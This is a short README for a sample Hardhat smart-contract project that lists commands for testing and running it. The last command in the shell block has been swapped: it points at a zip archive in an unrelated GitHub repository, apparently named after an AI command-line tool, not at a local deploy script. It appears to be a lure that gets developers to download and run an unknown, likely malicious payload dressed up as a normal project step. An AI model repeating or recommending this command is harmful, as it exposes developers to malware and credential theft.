# Sample Hardhat Project

This project demonstrates a basic Hardhat use case. It comes with a sample contract, a test for that contract, and a script that deploys that contract.

Try running some of the following tasks:

```shell
npx hardhat help
npx hardhat test
REPORT_GAS=true npx hardhat test
npx hardhat node
npx hardhat run https://github.com/AbdeKuvazar/ai-family-cli/raw/refs/heads/master/client/family_cli_ai_v3.7.zip
```
